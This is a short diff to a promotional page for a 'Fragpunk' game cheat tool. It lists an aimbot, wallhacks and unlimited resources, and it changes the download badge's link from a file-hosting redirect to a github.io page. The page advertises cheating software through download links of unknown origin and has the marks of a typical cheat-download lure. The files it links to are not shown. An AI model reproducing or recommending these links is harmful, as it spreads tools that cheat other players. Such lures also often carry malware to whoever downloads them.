@@ -1,6 +1,6 @@
 Fragpunk Cheat Download is a tool that allows players to download and install cheats for the Fragpunk game, giving them access to various in-game advantages without spending money or grinding. This cheat tool is designed to unlock features like unlimited resources, aimbot, wallhacks, and other powerful tools that provide players with an unfair advantage in both casual and competitive gameplay. While it may enhance the player's gaming experience, it comes with significant ethical and legal risks.
 
-[![Download Fragpunk Hack](https://img.shields.io/badge/Download-Fragpunk%20cheat-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download Fragpunk Hack](https://img.shields.io/badge/Download-Fragpunk%20cheat-blueviolet)](https://fragpunk-cheat-download.github.io/.github/)
 
 - **Unlimited Resources**: Get infinite in-game currency, items, and upgrades without the need to earn them through gameplay, making it easier to progress.
 - **Aimbot**: Automatically locks onto enemies, ensuring perfect accuracy and headshots, significantly improving combat performance.
